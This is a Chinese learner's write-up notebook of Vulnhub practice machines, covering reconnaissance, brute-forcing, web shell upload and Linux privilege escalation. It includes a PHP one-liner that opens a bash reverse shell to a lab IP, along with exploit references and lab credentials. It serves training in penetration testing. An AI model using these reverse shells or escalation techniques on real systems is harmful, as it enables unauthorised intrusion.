---
created: 2023-12-22T09:29
updated: 2024-03-10T10:52
---
#### Dr4g0n-b4ll （文件隐写，环境变量提权）
[「红队笔记」靶机精讲：Dr4g0nB4ll - Vulnhub靶机，简单靶机的高级打法，大量拓展，新手必看。_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1cy421z7ww/)
nmap 半开扫全端口只找到经典22端口和80端口。
![[Pasted image 20240310084516.png]]
网页发现：
这个`<br>`标签不知道是不是写错了写到文本里面了。
![[Pasted image 20240310085729.png]]
最下面有base64
![[Pasted image 20240310084548.png]]

```
<!-- VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 -->
```
网页首页发现base64嵌套解密得出：==DRAGON BALL==

使用dirsearch扫描网页目录文件：
![[Pasted image 20240310084719.png]]
只发现robots.txt文件

访问robots.txt文件还是base64
![[Pasted image 20240310084801.png]]
解密得出：
```
you find the hidden dir
```
你要找到隐藏目录，这里就可以拿上面我们唯一知道的内容来当做目录进行测试
测试成功；
http://172.16.123.114/DRAGON%20BALL/
![[Pasted image 20240310090925.png]]
==反思：当我们在网页上拿到比较关键的字符串等东西，我们就要想到可能是隐藏目录的关键，或者爆破的密码用户等，不要局限思维。==
分别打开。
![[Pasted image 20240310091031.png]]
下载secret.txt文件用扫描工具进行指定文件扫描。
使用sed配上类似正则的方法拼接。
```
sed 's|^|http://172.16.123.114|' secret.txt
```
![[Pasted image 20240310091831.png]]
```
sed 's|^|http://172.16.123.114|' secret.txt >> z.txt

sed 's|^|http://172.16.123.114/DRAGON%20BALL|' secret.txt >> z.txt

sed 's|^|http://172.16.123.114/DRAGON%20BALL/Vulnhub/|' secret.txt >> z.txt
```
然后要检查看看有没有看不见的空格改成%20

然后使用追加的方式把剩下的目录这样写到一个文件中进行跑
```
while read -r url;do curl "$url";done <z.txt
```
![[Pasted image 20240310092610.png]]
太多了不好观察。改一下参数。
```
while read -r url;do curl -o /dev/null -s -w "%{url_effective} http status : %{http_code} \n" "$url" ;done <z.txt | grep '200'

```
结果没一个成功。
![[Pasted image 20240310093037.png]]
不过也好这个文件算是全部渗透过了，接下来就是照片了

 exiftool 查看
![[Pasted image 20240310093738.png]]
对图片进行隐写。（想这种照片很有可能是有隐写东西的，这种关键地方不是那种图库那没必要去隐写）
 Stegseek 暴力解 Steghide 隐写数据
```
 stegseek 爆破文件 爆破密码文件
```
得到文件
![[Pasted image 20240310095056.png]]
很明显这是一个私钥，可以登录ssh
设置私钥权限
```
chmod 600 id_rsa                                                      
```
之前在登录那个网页看见有一个关键字![[Pasted image 20240310095800.png]]
xmen所以试试登录
![[Pasted image 20240310095819.png]]
找到可以执行文件
```
xmen@debian:~$ find / -perm -4000 -type f 2>/dev/null
```
很明显是用这些代码进行提权
对这些文件内容进行查看和使用，发现这个demo.c编译为可执行文件接收shell文件执行的内容。
![[Pasted image 20240310100256.png]]
而不是使用绝对路径执行ps所以可以使用环境变量

但是这个目录的权限是root的。
所以我们就使用环境变量绕过原ps的命令执行我们的ps文件
![[Pasted image 20240310100943.png]]
![[Pasted image 20240310101007.png]]
这回ps就是我们可以用的了，如果把那个执行目录的权限改了也没用，以为那样也只会得到那个文件所属人也就是自己的权限相当于转了一圈。==而且不一定修改的了==
![[Pasted image 20240310101348.png]]
这样我们ps文件就在原来的ps前面了。![[Pasted image 20240310101408.png]]
执行为空，以为内容是/bin/bash,所以我们执行shell文件就提权成功了。
让root执行这个命令。
![[Pasted image 20240310101513.png]]
![[Pasted image 20240310101916.png]]
###### 总结：
我们看见关键字一定要对其注意，可能是隐藏目录也可能是爆破名字，网站文件越少，信息越重要，每个都要想尽办法解开。
还有我的思维局限的原因应该是，题目做的比较少，和工具用的比较单一，所以思维局限了，今后要多看红队。


#### Lampiao
使用nmap半开放扫描全端口
![[Pasted image 20231222113722.png]]
详细扫描发现1898才是有东西的网站
![[Pasted image 20231222113901.png]]
扫描后台发现rotos.txt
![[Pasted image 20231222114116.png]]
收集信息发现框架版本号
![[Pasted image 20231222114247.png]]
![[Pasted image 20231222114229.png]]
搜索searchsploit看看有没有漏洞
![[Pasted image 20231222114417.png]]
查看44557.rb进入msf搜索漏洞模块![[Pasted image 20231222143911.png]]
![[Pasted image 20231222144042.png]]
设置好端口，ip，和target 就渗透成功了
![[Pasted image 20231222144832.png]]
查看内核版本发现是16年的存在脏牛漏洞
尝试渗透
可惜这个用户不行要本地用户
![[Pasted image 20231222151447.png]]
查看home目录发现用户名字
![[Pasted image 20231222152018.png]]
然后再用cewl把网站的信息收集为密码进行爆破
![[Pasted image 20231222152235.png]]
爆破成功![[Pasted image 20231222152436.png]]
使用脚本![[Pasted image 20231222152547.png]]
成功提权
找到flag
![[Pasted image 20231222152611.png]]
#### driftingblues9

靶机就开了80和111，80端口有个登录但是我用burp收集到的信息应该可能是web框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image1.png)


果然轻轻松松拿到shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image2.png)


登录成功直接出密码

\<?php

// DATABASE CONNECTION INFORMATION

define(\'DATABASE_HOST\', \'localhost\'); // Database host

define(\'DATABASE_NAME\', \'microblog\'); // Name of the database to be
used

define(\'DATABASE_USERNAME\', \'clapton\'); // User name for access to
database

define(\'DATABASE_PASSWORD\', \'yaraklitepe\'); // Password for access
to database

define(\'DB_ENCRYPT_KEY\', \'p52plaiqb8\'); // Database encryption key

define(\'DB_PREFIX\', \'mb101\_\'); // Unique prefix of all table names
in the database

?\>

nc反弹成功，之前一直没成功，可能是忘记了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image3.png)


python切换

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image4.png)


得到flag

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image5.png)


这个提示应该是和提权有关系

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image6.png)


提权失败感觉这个input文件有点奇怪

#### Ubuntu_CTF(SeedDMS)

只开启80和3306端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image7.png)


3306还对爆破做了控制

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image8.png)


只能从80端口找猫腻了

一没网站框架，二没子目录，三没可疑文件，透露的信息少之又少，所以只能打开burp抓包分析他的网站那些js代码了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image9.png)


找到个子目录访问得到seedDMS网站框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image10.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image11.png)


必须登录才能办事，所以我用cewl工具收集了信息进行密码用户爆破但是太多了根本不行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image12.png)


只能去寻找密码了（无果）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image13.png)


百度说在conf/settings.xml 里面有密码和用户真够狗（信息收集我还是太弱了）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image14.png)


登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image15.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image16.png)


登录失败

查看其他也标有user字样的目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image17.png)


发现admin的md5值

换了几个md5解码网站终于解码失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image18.png)


修改admin密码然后上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image19.png)


kali数据库太麻烦了直接选择 navicat下载图像化的才像样

<https://blog.csdn.net/m0_46829545/article/details/130172140>

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image20.png)


特别方便

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image21.png)


登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image22.png)


查看版本信息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image23.png)


版本都太高不能行了

发现文件上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image24.png)


上传成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image25.png)


找不到位置我们就扫

扫描工具太啦了，又没扫到

\\seeddms51x\\data\\1048576\\(文件序号)\\1.php(你上传的文件会被重命名为
1.php)，其中文件序号在后台的文档信息中的序号相对应

终于成功了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image26.png)


使用weevely生成木马反弹成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image27.png)


权限实在太低

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image28.png)


我们之前得到了saket的密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image29.png)


查看发现他可以bash

这时候只能从网页上试试权限了，木马反弹的不太行

这里要在后面加分号才行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image30.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image31.png)


bash反弹成功

\<?php system(\"bash -c \'bash -i \>& /dev/tcp/172.16.123.108/7777
0\>&1\'\");?\>

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image32.png)


很明显这个可以了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image33.png)


登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image34.png)


sudo su提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image35.png)


#### drippingblues（CVE-2021-4034 [polkit授权管理器 漏洞]）

ftp匿名登录发现zip

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image36.png)


john 爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image37.png)


得到提示

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image38.png)


首页发现一点点提示

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image39.png)


robots.txt泄漏

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image40.png)


第一个文件给了个密码破解一样的提示

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image41.png)


第二个提示应该是关于提权的，这么多提示真的是草了

解析参考发现这个drip是文件包含，可惜没想到发现密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image42.png)


#### imdrippinbiatch

再把之前从主页得到的用户名类似的跑一下这个密码登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image43.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image44.png)


提权：脏管道行不通

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image45.png)


CVE-2022-4034

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image46.png)


这里给的两个链接的都不是很好因为靶机没有make,只能运行个python
或者编译好C和shell

所以百度看看其他的exp有没有符合我们要求的（找到了但是靶机有问题）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image47.png)


提权失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image48.png)


重新导入靶机

第一次没成功第二次加满权限成功了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image49.png)


破靶机

#### Breakout（getcap查看文件功能）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image50.png)


首先查看smb服务是否有关键信息

并没有发现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image51.png)


直接扫80后台

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image52.png)


没发现什么好东西

在主页查看源码发现信息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image53.png)


这是密码学里面的一种加密

解码网页：<https://www.splitbrain.org/services/ook>

解码得到.2uqPEfj3D\<P\'a-3

接着访问10000和20000发现是两个不一样的登录网页

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image54.png)


所以我们先收集用户名

enum4linux IP

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image55.png)


收集到cyber用户,然后使用之前的密码登录

10000登录不行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image56.png)


20000可以

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image57.png)


找到语言改成中文

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image58.png)


发现终端,使用 bash反弹成功，从它没开22端口我就知道他是要反弹

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image59.png)


查看内核发现可能有脏管道漏洞（CVE-2022-0847）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image60.png)


还是用脚本跑一下看看没发现什么特别漏洞，倒是发现这个目录下有些好东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image61.png)


密码备份可惜要root权限

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image62.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image63.png)


查看tar发现是个可执行文件所以使用getcap工具查看：[getcap
可以获得程序文件所具有的能力 (CAP).]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image64.png)


发现他有读取的功能

按照他的help提示得到如下

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image65.png)


Ts&4&YurgtRX(=\~h 这个就是root密码

成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image66.png)


#### matrix-breakout-2-morp（CVE-2022-0847脏管道）

使用dirb扫描目录根本没东西，百度使用gobuster工具扫终于发现了可疑文件

gobuster dir -u http://172.16.123.106 -x php,bak,html,txt -w
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image67.png)


打开文件发现是一个可以写入的php所以先抓包测试一下。

发现可以在post改掉它输入的文字最后保存地址

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image68.png)


访问phpinfo.php果然成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image69.png)


写入执行命令木马后，信息收集发现flag1

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image70.png)


提示很重要

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image71.png)


查看passwd文件分析用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image72.png)


可能就是找密码然后登录后提权了。

按照翻译后的提示找到这个照片

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image73.png)


分析里面有没有密码(无果)

使用网上的后渗透脚本批量跑发现一个脏牛一样的漏洞可以使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image74.png)


使用不成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image75.png)


百度搜索漏洞其他的利用方法

git clone
[[https://github.com/imfiver/CVE-2022-0847.git]{.underline}](https://github.com/imfiver/CVE-2022-0847.git)

发现和还有脚本，使用看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image76.png)


终于提取成功了，

接着信息收集，发现之前那个81端口是用nginx搭建的所以我们看看nginx是不是有东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image77.png)


终于发现密码开始爆破，那个照片居然没什么用真坑。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image78.png)


半天爆破不出。

#### DC-6 （WordPress爆破，Activity monitor插件漏洞）

信息收集：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image79.png)


发现有wp-admin说明是wordpress框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image80.png)


网页访问是错误的，发现是wordy，说明是要改host，重定向。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image81.png)


修改hosts

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image82.png)


弱密码行不通

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image83.png)


使用wpscan扫用户名

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image84.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image85.png)


制作用户本

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image86.png)


跑密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image87.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image88.png)


爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image89.png)


使用（wp_admin_shell渗透）并未成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image90.png)


试试看从靶机网页上找Activity monitor插件漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image91.png)


搜索插件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image92.png)


渗透得shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image93.png)


提权信息搜集发现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image94.png)


发现密码和用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image95.png)


sudo -l 发现graham有 backups.sh的使用权限

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image96.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image97.png)


但是发现不对，百度发现要转换身份

转换身份：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image98.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image99.png)


sudo -l 发现namp提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image100.png)


使用普通的根本行不通

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image101.png)


使用msfconsole提权的也行不通，反弹不了，只能使用脚本的方法提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image102.png)


提权成功（一定要sudo在前面）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image103.png)


#### My_file_server(ssh私钥上传)

使用nmap扫服务和漏洞发现开启了smb服务像这种靶机不太可能存在系统漏洞所以可以直接放弃

使用nikto扫80网站发现txt打开就是密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image104.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image105.png)


发现smb服务有guest用户，使用smbclient登录目录查看重要文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image106.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image107.png)


竟然我们得到了密码就说明现在是在找用户名的时候

现在可疑文件翻看用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image108.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image109.png)


ftp登录后发现是home目录，可以放ssh公钥，登录ssh因为ssh只能使用公钥登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image110.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image111.png)


连接成功开始提权

查看内核发现符合脏牛的特征

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image112.png)


搜索提权文件提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image113.png)


这两个是我最爱用的两个

使用40616.c提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image114.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image115.png)


#### [Kioptrix: Level 1（mod_ssl \< 2.8.7）]

漏洞探测使用nmap进行半开放全端口扫描靶机，发现开启了，22,80,443，和一个可疑端口初步分析可能又是网址渗透ssh然后登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image116.png)


试试nc -lvn 查看1024端口的消息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image117.png)


并无收获

开始对网页信息探索

使用nikto发现test.php

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image118.png)


80端口吗发现发现可以子目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image119.png)


443目录页没任何信息估计是什么插件渗透其中中国mod_ssl很可疑使用searchsploit
查看发现21617.c比较符合

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image120.png)


这个使用kali自带的还不行需要自己去下载才能编译使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image121.png)


使用的时候需要对应版本去使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image122.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image123.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image124.png)


使用0x6b

提权成功（修改密码完事）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image125.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image126.png)


或者使用msfconsole自带的模块攻击

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image127.png)


#### MR-ROBOT: 1（hydra爆破网站用户）

信息搜集：使用nmap扫服务端口[发现又是常配的几个端口](https://twitter.com/home/?status=I%27m%20looking%20at%20Mr-Robot%3A%201%20(https%3A%2F%2Fwww.vulnhub.com%2Fentry%2Fmr-robot-1,151/%3Fsource%3Dtwitter)%20%23VulnHub)

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image128.png)


使用nikto发现又wordpress框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image129.png)


使用弱密码登录不成功，再使用wpsacn扫用户

扫到robots.txt

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image130.png)


访问发现有文章可以做

dic有可能是爆破的用户名或密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image131.png)


果然下载后是密码也可能是用户名

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image132.png)


但是这个txt就可能是md5，使用john爆破

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image133.png)


也有可能这个是密码

而那个dic是用户名的爆破

下载下来试试爆破

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image134.png)


百度是说dic及时用户名也是密码

所以就要进行爆破用户名才可以更快做到爆破密码

使用hydra爆破用户名

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image135.png)


然后爆破密码

爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image136.png)


上传木马反弹shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image137.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image138.png)


查看可用文件发现nmap提权文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image139.png)


正好msfconsole有提权的模板

